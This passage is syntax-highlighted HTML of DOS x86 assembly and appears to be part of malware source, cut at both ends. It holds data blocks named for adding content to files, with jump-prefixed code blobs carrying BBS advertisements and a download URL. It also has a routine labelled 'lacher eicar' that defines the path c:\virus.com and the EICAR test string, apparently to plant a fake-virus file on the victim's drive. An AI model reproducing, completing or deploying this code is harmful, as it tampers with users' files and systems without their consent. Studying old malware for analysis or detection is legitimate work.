         </span><span class="sc9">DB</span><span class="sc0"> </span><span class="sc2">0CDH</span><span class="sc4">,</span><span class="sc2">021H</span><span class="sc4">,</span><span class="sc2">0ACH</span><span class="sc4">,</span><span class="sc2">0B3H</span><span class="sc4">,</span><span class="sc2">060H</span><span class="sc4">,</span><span class="sc2">0B4H</span><span class="sc4">,</span><span class="sc2">00EH</span><span class="sc4">,</span><span class="sc2">0CDH</span><span class="sc4">,</span><span class="sc2">010H</span><span class="sc4">,</span><span class="sc2">0E2H</span><span class="sc0">
         </span><span class="sc9">DB</span><span class="sc0"> </span><span class="sc2">0F7H</span><span class="sc4">,</span><span class="sc2">0C3H</span><span class="sc4">,</span><span class="sc2">044H</span><span class="sc4">,</span><span class="sc2">06FH</span><span class="sc4">,</span><span class="sc2">077H</span><span class="sc4">,</span><span class="sc2">06EH</span><span class="sc4">,</span><span class="sc2">06CH</span><span class="sc4">,</span><span class="sc2">06FH</span><span class="sc4">,</span><span class="sc2">061H</span><span class="sc4">,</span><span class="sc2">064H</span><span class="sc0">
         </span><span class="sc9">DB</span><span class="sc0"> </span><span class="sc2">065H</span><span class="sc4">,</span><span class="sc2">064H</span><span class="sc4">,</span><span class="sc2">020H</span><span class="sc4">,</span><span class="sc2">046H</span><span class="sc4">,</span><span class="sc2">072H</span><span class="sc4">,</span><span class="sc2">06FH</span><span class="sc4">,</span><span class="sc2">06DH</span><span class="sc4">,</span><span class="sc2">068H</span><span class="sc4">,</span><span class="sc2">074H</span><span class="sc4">,</span><span class="sc2">074H</span><span class="sc0">
         </span><span class="sc9">DB</span><span class="sc0"> </span><span class="sc2">070H</span><span class="sc4">,</span><span class="sc2">03AH</span><span class="sc4">,</span><span class="sc2">02FH</span><span class="sc4">,</span><span class="sc2">02FH</span><span class="sc4">,</span><span class="sc2">077H</span><span class="sc4">,</span><span class="sc2">077H</span><span class="sc4">,</span><span class="sc2">077H</span><span class="sc4">,</span><span class="sc2">02EH</span><span class="sc4">,</span><span class="sc2">06EH</span><span class="sc4">,</span><span class="sc2">061H</span><span class="sc0">
         </span><span class="sc9">DB</span><span class="sc0"> </span><span class="sc2">072H</span><span class="sc4">,</span><span class="sc2">06BH</span><span class="sc4">,</span><span class="sc2">06FH</span><span class="sc4">,</span><span class="sc2">074H</span><span class="sc4">,</span><span class="sc2">069H</span><span class="sc4">,</span><span class="sc2">063H</span><span class="sc4">,</span><span class="sc2">02EH</span><span class="sc4">,</span><span class="sc2">063H</span><span class="sc4">,</span><span class="sc2">06FH</span><span class="sc4">,</span><span class="sc2">06DH</span><span class="sc0">
         </span><span class="sc9">DB</span><span class="sc0"> </span><span class="sc2">02FH</span><span class="sc4">,</span><span class="sc2">07EH</span><span class="sc4">,</span><span class="sc2">076H</span><span class="sc4">,</span><span class="sc2">069H</span><span class="sc4">,</span><span class="sc2">063H</span><span class="sc4">,</span><span class="sc2">06FH</span><span class="sc0">
</span><span class="sc5">file_add_size1</span><span class="sc0"> </span><span class="sc9">equ</span><span class="sc0"> </span><span class="sc10">$</span><span class="sc0"> </span><span class="sc4">-</span><span class="sc0"> </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">file_add_content1</span><span class="sc0">

</span><span class="sc5">file_add_content2</span><span class="sc4">:</span><span class="sc0">      </span><span class="sc1">;defile</span><span class="sc0">
</span><span class="sc9">db</span><span class="sc0"> </span><span class="sc2">0E9h</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0DAh</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc4">,</span><span class="sc2">69h</span><span class="sc0"> 
  </span><span class="sc1">;           DB 0B0H,013H,0CDH,010H,</span><span class="sc0">
     </span><span class="sc9">DB</span><span class="sc0"> </span><span class="sc2">0BDH</span><span class="sc4">,</span><span class="sc2">000H</span><span class="sc4">,</span><span class="sc2">001H</span><span class="sc4">,</span><span class="sc2">0FAH</span><span class="sc4">,</span><span class="sc2">0BAH</span><span class="sc4">,</span><span class="sc2">0DAH</span><span class="sc0">
         </span><span class="sc9">DB</span><span class="sc0"> </span><span class="sc2">003H</span><span class="sc4">,</span><span class="sc2">0ECH</span><span class="sc4">,</span><span class="sc2">0A8H</span><span class="sc4">,</span><span class="sc2">008H</span><span class="sc4">,</span><span class="sc2">074H</span><span class="sc4">,</span><span class="sc2">0FBH</span><span class="sc4">,</span><span class="sc2">0B8H</span><span class="sc4">,</span><span class="sc2">000H</span><span class="sc4">,</span><span class="sc2">0A0H</span><span class="sc4">,</span><span class="sc2">08EH</span><span class="sc0">
         </span><span class="sc9">DB</span><span class="sc0"> </span><span class="sc2">0C0H</span><span class="sc4">,</span><span class="sc2">08EH</span><span class="sc4">,</span><span class="sc2">0D8H</span><span class="sc4">,</span><span class="sc2">0B1H</span><span class="sc4">,</span><span class="sc2">009H</span><span class="sc4">,</span><span class="sc2">0BBH</span><span class="sc4">,</span><span class="sc2">002H</span><span class="sc4">,</span><span class="sc2">064H</span><span class="sc4">,</span><span class="sc2">051H</span><span class="sc4">,</span><span class="sc2">08BH</span><span class="sc0">
         </span><span class="sc9">DB</span><span class="sc0"> </span><span class="sc2">0F3H</span><span class="sc4">,</span><span class="sc2">083H</span><span class="sc4">,</span><span class="sc2">0C6H</span><span class="sc4">,</span><span class="sc2">004H</span><span class="sc4">,</span><span class="sc2">08BH</span><span class="sc4">,</span><span class="sc2">0FBH</span><span class="sc4">,</span><span class="sc2">0B1H</span><span class="sc4">,</span><span class="sc2">09FH</span><span class="sc4">,</span><span class="sc2">0F3H</span><span class="sc4">,</span><span class="sc2">0A5H</span><span class="sc0">
         </span><span class="sc9">DB</span><span class="sc0"> </span><span class="sc2">081H</span><span class="sc4">,</span><span class="sc2">0C3H</span><span class="sc4">,</span><span class="sc2">000H</span><span class="sc4">,</span><span class="sc2">005H</span><span class="sc4">,</span><span class="sc2">059H</span><span class="sc4">,</span><span class="sc2">0E2H</span><span class="sc4">,</span><span class="sc2">0EDH</span><span class="sc4">,</span><span class="sc2">033H</span><span class="sc4">,</span><span class="sc2">0F6H</span><span class="sc4">,</span><span class="sc2">02EH</span><span class="sc0">
         </span><span class="sc9">DB</span><span class="sc0"> </span><span class="sc2">08EH</span><span class="sc4">,</span><span class="sc2">006H</span><span class="sc4">,</span><span class="sc2">0D9H</span><span class="sc4">,</span><span class="sc2">001H</span><span class="sc4">,</span><span class="sc2">0BBH</span><span class="sc4">,</span><span class="sc2">06EH</span><span class="sc4">,</span><span class="sc2">0FAH</span><span class="sc4">,</span><span class="sc2">003H</span><span class="sc4">,</span><span class="sc2">0DDH</span><span class="sc4">,</span><span class="sc2">026H</span><span class="sc0">
         </span><span class="sc9">DB</span><span class="sc0"> </span><span class="sc2">08AH</span><span class="sc4">,</span><span class="sc2">000H</span><span class="sc4">,</span><span class="sc2">02EH</span><span class="sc4">,</span><span class="sc2">022H</span><span class="sc4">,</span><span class="sc2">006H</span><span class="sc4">,</span><span class="sc2">0D8H</span><span class="sc4">,</span><span class="sc2">001H</span><span class="sc4">,</span><span class="sc2">074H</span><span class="sc4">,</span><span class="sc2">015H</span><span class="sc4">,</span><span class="sc2">0BBH</span><span class="sc0">
         </span><span class="sc9">DB</span><span class="sc0"> </span><span class="sc2">03FH</span><span class="sc4">,</span><span class="sc2">065H</span><span class="sc4">,</span><span class="sc2">033H</span><span class="sc4">,</span><span class="sc2">0FFH</span><span class="sc4">,</span><span class="sc2">081H</span><span class="sc4">,</span><span class="sc2">0C3H</span><span class="sc4">,</span><span class="sc2">000H</span><span class="sc4">,</span><span class="sc2">005H</span><span class="sc4">,</span><span class="sc2">047H</span><span class="sc4">,</span><span class="sc2">03BH</span><span class="sc0">
         </span><span class="sc9">DB</span><span class="sc0"> </span><span class="sc2">0F7H</span><span class="sc4">,</span><span class="sc2">07DH</span><span class="sc4">,</span><span class="sc2">0F7H</span><span class="sc4">,</span><span class="sc2">08BH</span><span class="sc4">,</span><span class="sc2">0CEH</span><span class="sc4">,</span><span class="sc2">080H</span><span class="sc4">,</span><span class="sc2">0C1H</span><span class="sc4">,</span><span class="sc2">019H</span><span class="sc4">,</span><span class="sc2">088H</span><span class="sc4">,</span><span class="sc2">00FH</span><span class="sc0">
         </span><span class="sc9">DB</span><span class="sc0"> </span><span class="sc2">046H</span><span class="sc4">,</span><span class="sc2">083H</span><span class="sc4">,</span><span class="sc2">0FEH</span><span class="sc4">,</span><span class="sc2">008H</span><span class="sc4">,</span><span class="sc2">075H</span><span class="sc4">,</span><span class="sc2">0D6H</span><span class="sc4">,</span><span class="sc2">00EH</span><span class="sc4">,</span><span class="sc2">01FH</span><span class="sc4">,</span><span class="sc2">0D0H</span><span class="sc4">,</span><span class="sc2">00EH</span><span class="sc0">
         </span><span class="sc9">DB</span><span class="sc0"> </span><span class="sc2">0D8H</span><span class="sc4">,</span><span class="sc2">001H</span><span class="sc4">,</span><span class="sc2">080H</span><span class="sc4">,</span><span class="sc2">03EH</span><span class="sc4">,</span><span class="sc2">0D8H</span><span class="sc4">,</span><span class="sc2">001H</span><span class="sc4">,</span><span class="sc2">080H</span><span class="sc4">,</span><span class="sc2">075H</span><span class="sc4">,</span><span class="sc2">01CH</span><span class="sc4">,</span><span class="sc2">0FFH</span><span class="sc0">
         </span><span class="sc9">DB</span><span class="sc0"> </span><span class="sc2">006H</span><span class="sc4">,</span><span class="sc2">0DBH</span><span class="sc4">,</span><span class="sc2">001H</span><span class="sc4">,</span><span class="sc2">08BH</span><span class="sc4">,</span><span class="sc2">036H</span><span class="sc4">,</span><span class="sc2">0DBH</span><span class="sc4">,</span><span class="sc2">001H</span><span class="sc4">,</span><span class="sc2">08AH</span><span class="sc4">,</span><span class="sc2">084H</span><span class="sc4">,</span><span class="sc2">09CH</span><span class="sc0">
         </span><span class="sc9">DB</span><span class="sc0"> </span><span class="sc2">001H</span><span class="sc4">,</span><span class="sc2">03CH</span><span class="sc4">,</span><span class="sc2">000H</span><span class="sc4">,</span><span class="sc2">075H</span><span class="sc4">,</span><span class="sc2">006H</span><span class="sc4">,</span><span class="sc2">031H</span><span class="sc4">,</span><span class="sc2">036H</span><span class="sc4">,</span><span class="sc2">0DBH</span><span class="sc4">,</span><span class="sc2">001H</span><span class="sc4">,</span><span class="sc2">0EBH</span><span class="sc0">
         </span><span class="sc9">DB</span><span class="sc0"> </span><span class="sc2">0EAH</span><span class="sc4">,</span><span class="sc2">0B3H</span><span class="sc4">,</span><span class="sc2">008H</span><span class="sc4">,</span><span class="sc2">0F6H</span><span class="sc4">,</span><span class="sc2">0E3H</span><span class="sc4">,</span><span class="sc2">08BH</span><span class="sc4">,</span><span class="sc2">0E8H</span><span class="sc4">,</span><span class="sc2">0E4H</span><span class="sc4">,</span><span class="sc2">060H</span><span class="sc4">,</span><span class="sc2">03CH</span><span class="sc0">
         </span><span class="sc9">DB</span><span class="sc0"> </span><span class="sc2">001H</span><span class="sc4">,</span><span class="sc2">074H</span><span class="sc4">,</span><span class="sc2">003H</span><span class="sc4">,</span><span class="sc2">0E9H</span><span class="sc4">,</span><span class="sc2">076H</span><span class="sc4">,</span><span class="sc2">0FFH</span><span class="sc4">,</span><span class="sc2">0FBH</span><span class="sc4">,</span><span class="sc2">0B8H</span><span class="sc4">,</span><span class="sc2">003H</span><span class="sc4">,</span><span class="sc2">000H</span><span class="sc0">
         </span><span class="sc9">DB</span><span class="sc0"> </span><span class="sc2">0CDH</span><span class="sc4">,</span><span class="sc2">010H</span><span class="sc4">,</span><span class="sc2">0B4H</span><span class="sc4">,</span><span class="sc2">04CH</span><span class="sc4">,</span><span class="sc2">0CDH</span><span class="sc4">,</span><span class="sc2">021H</span><span class="sc4">,</span><span class="sc2">020H</span><span class="sc4">,</span><span class="sc2">044H</span><span class="sc4">,</span><span class="sc2">061H</span><span class="sc4">,</span><span class="sc2">020H</span><span class="sc0">
         </span><span class="sc9">DB</span><span class="sc0"> </span><span class="sc2">042H</span><span class="sc4">,</span><span class="sc2">065H</span><span class="sc4">,</span><span class="sc2">053H</span><span class="sc4">,</span><span class="sc2">074H</span><span class="sc4">,</span><span class="sc2">020H</span><span class="sc4">,</span><span class="sc2">042H</span><span class="sc4">,</span><span class="sc2">06FH</span><span class="sc4">,</span><span class="sc2">061H</span><span class="sc4">,</span><span class="sc2">052H</span><span class="sc4">,</span><span class="sc2">064H</span><span class="sc0">
         </span><span class="sc9">DB</span><span class="sc0"> </span><span class="sc2">020H</span><span class="sc4">,</span><span class="sc2">049H</span><span class="sc4">,</span><span class="sc2">06EH</span><span class="sc4">,</span><span class="sc2">020H</span><span class="sc4">,</span><span class="sc2">053H</span><span class="sc4">,</span><span class="sc2">050H</span><span class="sc4">,</span><span class="sc2">061H</span><span class="sc4">,</span><span class="sc2">069H</span><span class="sc4">,</span><span class="sc2">04EH</span><span class="sc4">,</span><span class="sc2">03AH</span><span class="sc0">
         </span><span class="sc9">DB</span><span class="sc0"> </span><span class="sc2">020H</span><span class="sc4">,</span><span class="sc2">045H</span><span class="sc4">,</span><span class="sc2">06CH</span><span class="sc4">,</span><span class="sc2">020H</span><span class="sc4">,</span><span class="sc2">047H</span><span class="sc4">,</span><span class="sc2">072H</span><span class="sc4">,</span><span class="sc2">069H</span><span class="sc4">,</span><span class="sc2">04CH</span><span class="sc4">,</span><span class="sc2">04CH</span><span class="sc4">,</span><span class="sc2">06FH</span><span class="sc0">
         </span><span class="sc9">DB</span><span class="sc0"> </span><span class="sc2">020H</span><span class="sc4">,</span><span class="sc2">04CH</span><span class="sc4">,</span><span class="sc2">06FH</span><span class="sc4">,</span><span class="sc2">063H</span><span class="sc4">,</span><span class="sc2">06FH</span><span class="sc4">,</span><span class="sc2">020H</span><span class="sc4">,</span><span class="sc2">028H</span><span class="sc4">,</span><span class="sc2">033H</span><span class="sc4">,</span><span class="sc2">034H</span><span class="sc4">,</span><span class="sc2">02DH</span><span class="sc0">
         </span><span class="sc9">DB</span><span class="sc0"> </span><span class="sc2">031H</span><span class="sc4">,</span><span class="sc2">02DH</span><span class="sc4">,</span><span class="sc2">033H</span><span class="sc4">,</span><span class="sc2">035H</span><span class="sc4">,</span><span class="sc2">032H</span><span class="sc4">,</span><span class="sc2">020H</span><span class="sc4">,</span><span class="sc2">032H</span><span class="sc4">,</span><span class="sc2">034H</span><span class="sc4">,</span><span class="sc2">020H</span><span class="sc4">,</span><span class="sc2">034H</span><span class="sc0">
         </span><span class="sc9">DB</span><span class="sc0"> </span><span class="sc2">035H</span><span class="sc4">,</span><span class="sc2">029H</span><span class="sc4">,</span><span class="sc2">020H</span><span class="sc4">,</span><span class="sc2">020H</span><span class="sc4">,</span><span class="sc2">020H</span><span class="sc4">,</span><span class="sc2">000H</span><span class="sc4">,</span><span class="sc2">080H</span><span class="sc4">,</span><span class="sc2">000H</span><span class="sc4">,</span><span class="sc2">0F0H</span><span class="sc4">,</span><span class="sc2">000H</span><span class="sc0">
         </span><span class="sc9">DB</span><span class="sc0"> </span><span class="sc2">000H</span><span class="sc0">
</span><span class="sc5">file_add_size2</span><span class="sc0"> </span><span class="sc9">equ</span><span class="sc0"> </span><span class="sc10">$</span><span class="sc0"> </span><span class="sc4">-</span><span class="sc0"> </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">file_add_content2</span><span class="sc0">

</span><span class="sc5">file_add_content3</span><span class="sc4">:</span><span class="sc0">      </span><span class="sc1">;road</span><span class="sc0">
</span><span class="sc9">db</span><span class="sc0"> </span><span class="sc2">0E9h</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0C4h</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc4">,</span><span class="sc2">69h</span><span class="sc0">
 </span><span class="sc1">;            DB 0B0H,013H,0CDH,010H,</span><span class="sc0">
     </span><span class="sc9">DB</span><span class="sc0"> </span><span class="sc2">032H</span><span class="sc4">,</span><span class="sc2">0EDH</span><span class="sc4">,</span><span class="sc2">0BEH</span><span class="sc4">,</span><span class="sc2">0A3H</span><span class="sc4">,</span><span class="sc2">001H</span><span class="sc4">,</span><span class="sc2">0BAH</span><span class="sc0">
         </span><span class="sc9">DB</span><span class="sc0"> </span><span class="sc2">00CH</span><span class="sc4">,</span><span class="sc2">004H</span><span class="sc4">,</span><span class="sc2">0B4H</span><span class="sc4">,</span><span class="sc2">002H</span><span class="sc4">,</span><span class="sc2">0CDH</span><span class="sc4">,</span><span class="sc2">010H</span><span class="sc4">,</span><span class="sc2">0B1H</span><span class="sc4">,</span><span class="sc2">010H</span><span class="sc4">,</span><span class="sc2">0ACH</span><span class="sc4">,</span><span class="sc2">0B3H</span><span class="sc0">
         </span><span class="sc9">DB</span><span class="sc0"> </span><span class="sc2">004H</span><span class="sc4">,</span><span class="sc2">0B4H</span><span class="sc4">,</span><span class="sc2">00EH</span><span class="sc4">,</span><span class="sc2">0CDH</span><span class="sc4">,</span><span class="sc2">010H</span><span class="sc4">,</span><span class="sc2">0E2H</span><span class="sc4">,</span><span class="sc2">0F7H</span><span class="sc4">,</span><span class="sc2">0BAH</span><span class="sc4">,</span><span class="sc2">00AH</span><span class="sc4">,</span><span class="sc2">006H</span><span class="sc0">
         </span><span class="sc9">DB</span><span class="sc0"> </span><span class="sc2">0B4H</span><span class="sc4">,</span><span class="sc2">002H</span><span class="sc4">,</span><span class="sc2">0CDH</span><span class="sc4">,</span><span class="sc2">010H</span><span class="sc4">,</span><span class="sc2">0B1H</span><span class="sc4">,</span><span class="sc2">014H</span><span class="sc4">,</span><span class="sc2">0ACH</span><span class="sc4">,</span><span class="sc2">0B3H</span><span class="sc4">,</span><span class="sc2">002H</span><span class="sc4">,</span><span class="sc2">0B4H</span><span class="sc0">
         </span><span class="sc9">DB</span><span class="sc0"> </span><span class="sc2">00EH</span><span class="sc4">,</span><span class="sc2">0CDH</span><span class="sc4">,</span><span class="sc2">010H</span><span class="sc4">,</span><span class="sc2">0E2H</span><span class="sc4">,</span><span class="sc2">0F7H</span><span class="sc4">,</span><span class="sc2">068H</span><span class="sc4">,</span><span class="sc2">000H</span><span class="sc4">,</span><span class="sc2">0A0H</span><span class="sc4">,</span><span class="sc2">007H</span><span class="sc4">,</span><span class="sc2">006H</span><span class="sc0">
         </span><span class="sc9">DB</span><span class="sc0"> </span><span class="sc2">01FH</span><span class="sc4">,</span><span class="sc2">0BFH</span><span class="sc4">,</span><span class="sc2">040H</span><span class="sc4">,</span><span class="sc2">0ABH</span><span class="sc4">,</span><span class="sc2">0B5H</span><span class="sc4">,</span><span class="sc2">078H</span><span class="sc4">,</span><span class="sc2">060H</span><span class="sc4">,</span><span class="sc2">0BBH</span><span class="sc4">,</span><span class="sc2">07EH</span><span class="sc4">,</span><span class="sc2">0FAH</span><span class="sc0">
         </span><span class="sc9">DB</span><span class="sc0"> </span><span class="sc2">08DH</span><span class="sc4">,</span><span class="sc2">0B7H</span><span class="sc4">,</span><span class="sc2">072H</span><span class="sc4">,</span><span class="sc2">005H</span><span class="sc4">,</span><span class="sc2">0BDH</span><span class="sc4">,</span><span class="sc2">0A0H</span><span class="sc4">,</span><span class="sc2">000H</span><span class="sc4">,</span><span class="sc2">003H</span><span class="sc4">,</span><span class="sc2">02FH</span><span class="sc4">,</span><span class="sc2">02BH</span><span class="sc0">
         </span><span class="sc9">DB</span><span class="sc0"> </span><span class="sc2">02EH</span><span class="sc4">,</span><span class="sc2">020H</span><span class="sc4">,</span><span class="sc2">0FAH</span><span class="sc4">,</span><span class="sc2">08DH</span><span class="sc4">,</span><span class="sc2">00AH</span><span class="sc4">,</span><span class="sc2">096H</span><span class="sc4">,</span><span class="sc2">08DH</span><span class="sc4">,</span><span class="sc2">033H</span><span class="sc4">,</span><span class="sc2">02BH</span><span class="sc4">,</span><span class="sc2">0E8H</span><span class="sc0">
         </span><span class="sc9">DB</span><span class="sc0"> </span><span class="sc2">06BH</span><span class="sc4">,</span><span class="sc2">0C0H</span><span class="sc4">,</span><span class="sc2">0FEH</span><span class="sc4">,</span><span class="sc2">050H</span><span class="sc4">,</span><span class="sc2">0B0H</span><span class="sc4">,</span><span class="sc2">007H</span><span class="sc4">,</span><span class="sc2">0F3H</span><span class="sc4">,</span><span class="sc2">0AAH</span><span class="sc4">,</span><span class="sc2">059H</span><span class="sc4">,</span><span class="sc2">040H</span><span class="sc0">
         </span><span class="sc9">DB</span><span class="sc0"> </span><span class="sc2">0F3H</span><span class="sc4">,</span><span class="sc2">0AAH</span><span class="sc4">,</span><span class="sc2">0B9H</span><span class="sc4">,</span><span class="sc2">040H</span><span class="sc4">,</span><span class="sc2">001H</span><span class="sc4">,</span><span class="sc2">02BH</span><span class="sc4">,</span><span class="sc2">0CDH</span><span class="sc4">,</span><span class="sc2">048H</span><span class="sc4">,</span><span class="sc2">042H</span><span class="sc4">,</span><span class="sc2">0F6H</span><span class="sc0">
         </span><span class="sc9">DB</span><span class="sc0"> </span><span class="sc2">0C2H</span><span class="sc4">,</span><span class="sc2">008H</span><span class="sc4">,</span><span class="sc2">074H</span><span class="sc4">,</span><span class="sc2">002H</span><span class="sc4">,</span><span class="sc2">088H</span><span class="sc4">,</span><span class="sc2">004H</span><span class="sc4">,</span><span class="sc2">0F3H</span><span class="sc4">,</span><span class="sc2">0AAH</span><span class="sc4">,</span><span class="sc2">080H</span><span class="sc4">,</span><span class="sc2">0EBH</span><span class="sc0">
         </span><span class="sc9">DB</span><span class="sc0"> </span><span class="sc2">002H</span><span class="sc4">,</span><span class="sc2">075H</span><span class="sc4">,</span><span class="sc2">0CBH</span><span class="sc4">,</span><span class="sc2">0BEH</span><span class="sc4">,</span><span class="sc2">002H</span><span class="sc4">,</span><span class="sc2">0FAH</span><span class="sc4">,</span><span class="sc2">0B1H</span><span class="sc4">,</span><span class="sc2">03FH</span><span class="sc4">,</span><span class="sc2">0F3H</span><span class="sc4">,</span><span class="sc2">0A5H</span><span class="sc0">
         </span><span class="sc9">DB</span><span class="sc0"> </span><span class="sc2">061H</span><span class="sc4">,</span><span class="sc2">04AH</span><span class="sc4">,</span><span class="sc2">052H</span><span class="sc4">,</span><span class="sc2">0B8H</span><span class="sc4">,</span><span class="sc2">0D9H</span><span class="sc4">,</span><span class="sc2">0FFH</span><span class="sc4">,</span><span class="sc2">0F7H</span><span class="sc4">,</span><span class="sc2">0E9H</span><span class="sc4">,</span><span class="sc2">003H</span><span class="sc4">,</span><span class="sc2">0DAH</span><span class="sc0">
         </span><span class="sc9">DB</span><span class="sc0"> </span><span class="sc2">003H</span><span class="sc4">,</span><span class="sc2">0CBH</span><span class="sc4">,</span><span class="sc2">08BH</span><span class="sc4">,</span><span class="sc2">0C1H</span><span class="sc4">,</span><span class="sc2">0C1H</span><span class="sc4">,</span><span class="sc2">0F8H</span><span class="sc4">,</span><span class="sc2">00AH</span><span class="sc4">,</span><span class="sc2">02DH</span><span class="sc4">,</span><span class="sc2">01EH</span><span class="sc4">,</span><span class="sc2">000H</span><span class="sc0">
         </span><span class="sc9">DB</span><span class="sc0"> </span><span class="sc2">0A3H</span><span class="sc4">,</span><span class="sc2">07EH</span><span class="sc4">,</span><span class="sc2">0FAH</span><span class="sc4">,</span><span class="sc2">0BAH</span><span class="sc4">,</span><span class="sc2">0DAH</span><span class="sc4">,</span><span class="sc2">003H</span><span class="sc4">,</span><span class="sc2">0ECH</span><span class="sc4">,</span><span class="sc2">0A8H</span><span class="sc4">,</span><span class="sc2">008H</span><span class="sc4">,</span><span class="sc2">074H</span><span class="sc0">
         </span><span class="sc9">DB</span><span class="sc0"> </span><span class="sc2">0FBH</span><span class="sc4">,</span><span class="sc2">05AH</span><span class="sc4">,</span><span class="sc2">0E4H</span><span class="sc4">,</span><span class="sc2">060H</span><span class="sc4">,</span><span class="sc2">098H</span><span class="sc4">,</span><span class="sc2">048H</span><span class="sc4">,</span><span class="sc2">075H</span><span class="sc4">,</span><span class="sc2">09AH</span><span class="sc4">,</span><span class="sc2">0B0H</span><span class="sc4">,</span><span class="sc2">003H</span><span class="sc0">
         </span><span class="sc9">DB</span><span class="sc0"> </span><span class="sc2">0CDH</span><span class="sc4">,</span><span class="sc2">010H</span><span class="sc4">,</span><span class="sc2">0C3H</span><span class="sc4">,</span><span class="sc2">02AH</span><span class="sc4">,</span><span class="sc2">020H</span><span class="sc4">,</span><span class="sc2">052H</span><span class="sc4">,</span><span class="sc2">04FH</span><span class="sc4">,</span><span class="sc2">041H</span><span class="sc4">,</span><span class="sc2">044H</span><span class="sc4">,</span><span class="sc2">04BH</span><span class="sc0">
         </span><span class="sc9">DB</span><span class="sc0"> </span><span class="sc2">049H</span><span class="sc4">,</span><span class="sc2">04CH</span><span class="sc4">,</span><span class="sc2">04CH</span><span class="sc4">,</span><span class="sc2">020H</span><span class="sc4">,</span><span class="sc2">042H</span><span class="sc4">,</span><span class="sc2">042H</span><span class="sc4">,</span><span class="sc2">053H</span><span class="sc4">,</span><span class="sc2">020H</span><span class="sc4">,</span><span class="sc2">02AH</span><span class="sc4">,</span><span class="sc2">043H</span><span class="sc0">
         </span><span class="sc9">DB</span><span class="sc0"> </span><span class="sc2">061H</span><span class="sc4">,</span><span class="sc2">06CH</span><span class="sc4">,</span><span class="sc2">06CH</span><span class="sc4">,</span><span class="sc2">020H</span><span class="sc4">,</span><span class="sc2">06EH</span><span class="sc4">,</span><span class="sc2">06FH</span><span class="sc4">,</span><span class="sc2">077H</span><span class="sc4">,</span><span class="sc2">020H</span><span class="sc4">,</span><span class="sc2">030H</span><span class="sc4">,</span><span class="sc2">032H</span><span class="sc0">
         </span><span class="sc9">DB</span><span class="sc0"> </span><span class="sc2">038H</span><span class="sc4">,</span><span class="sc2">02DH</span><span class="sc4">,</span><span class="sc2">036H</span><span class="sc4">,</span><span class="sc2">036H</span><span class="sc4">,</span><span class="sc2">032H</span><span class="sc4">,</span><span class="sc2">031H</span><span class="sc4">,</span><span class="sc2">035H</span><span class="sc4">,</span><span class="sc2">039H</span><span class="sc4">,</span><span class="sc2">030H</span><span class="sc0">
</span><span class="sc5">file_add_size3</span><span class="sc0"> </span><span class="sc9">equ</span><span class="sc0"> </span><span class="sc10">$</span><span class="sc0"> </span><span class="sc4">-</span><span class="sc0"> </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">file_add_content3</span><span class="sc0">

</span><span class="sc1">;************************************************************</span><span class="sc0">
</span><span class="sc1">;******************** lacher eicar *****************************</span><span class="sc0">
</span><span class="sc1">;************************************************************</span><span class="sc0">

</span><span class="sc5">eicar_file</span><span class="sc0">      </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc3">"c:\virus.com"</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0">
</span><span class="sc5">eicar_content</span><span class="sc0">    </span><span class="sc9">DB</span><span class="sc0"> </span><span class="sc2">058H</span><span class="sc4">,</span><span class="sc2">035H</span><span class="sc4">,</span><span class="sc2">04FH</span><span class="sc4">,</span><span class="sc2">021H</span><span class="sc4">,</span><span class="sc2">050H</span><span class="sc4">,</span><span class="sc2">025H</span><span class="sc4">,</span><span class="sc2">040H</span><span class="sc4">,</span><span class="sc2">041H</span><span class="sc4">,</span><span class="sc2">050H</span><span class="sc4">,</span><span class="sc2">05BH</span><span class="sc0">
        </span><span class="sc9">DB</span><span class="sc0"> </span><span class="sc2">034H</span><span class="sc4">,</span><span class="sc2">05CH</span><span class="sc4">,</span><span class="sc2">050H</span><span class="sc4">,</span><span class="sc2">05AH</span><span class="sc4">,</span><span class="sc2">058H</span><span class="sc4">,</span><span class="sc2">035H</span><span class="sc4">,</span><span class="sc2">034H</span><span class="sc4">,</span><span class="sc2">028H</span><span class="sc4">,</span><span class="sc2">050H</span><span class="sc4">,</span><span class="sc2">05EH</span><span class="sc0">
         </span><span class="sc9">DB</span><span class="sc0"> </span><span class="sc2">029H</span><span class="sc4">,</span><span class="sc2">037H</span><span class="sc4">,</span><span class="sc2">043H</span><span class="sc4">,</span><span class="sc2">043H</span><span class="sc4">,</span><span class="sc2">029H</span><span class="sc4">,</span><span class="sc2">037H</span><span class="sc4">,</span><span class="sc2">07DH</span><span class="sc4">,</span><span class="sc2">024H</span><span class="sc4">,</span><span class="sc2">045H</span><span class="sc4">,</span><span class="sc2">049H</span><span class="sc0">
         </span><span class="sc9">DB</span><span class="sc0"> </span><span class="sc2">043H</span><span class="sc4">,</span><span class="sc2">041H</span><span class="sc4">,</span><span class="sc2">052H</span><span class="sc4">,</span><span class="sc2">02DH</span><span class="sc4">,</span><span class="sc2">053H</span><span class="sc4">,</span><span class="sc2">054H</span><span class="sc4">,</span><span class="sc2">041H</span><span class="sc4">,</span><span class="sc2">04EH</span><span class="sc4">,</span><span class="sc2">044H</span><span class="sc4">,</span><span class="sc2">041H</span><span class="sc0">
        </span><span class="sc9">DB</span><span class="sc0"> </span><span class="sc2">052H</span><span class="sc4">,</span><span class="sc2">044H</span><span class="sc4">,</span><span class="sc2">02DH</span><span class="sc4">,</span><span class="sc2">041H</span><span class="sc4">,</span><span class="sc2">04EH</span><span class="sc4">,</span><span class="sc2">054H</span><span class="sc4">,</span><span class="sc2">049H</span><span class="sc4">,</span><span class="sc2">056H</span><span class="sc4">,</span><span class="sc2">049H</span><span class="sc4">,</span><span class="sc2">052H</span><span class="sc0">
         </span><span class="sc9">DB</span><span class="sc0"> </span><span class="sc2">055H</span><span class="sc4">,</span><span class="sc2">053H</span><span class="sc4">,</span><span class="sc2">02DH</span><span class="sc4">,</span><span class="sc2">054H</span><span class="sc4">,</span><span class="sc2">045H</span><span class="sc4">,</span><span class="sc2">053H</span><span class="sc4">,</span><span class="sc2">054H</span><span class="sc4">,</span><span class="sc2">02DH</span><span class="sc4">,</span><span class="sc2">046H</span><span class="sc4">,</span><span class="sc2">049H</span><span class="sc0">
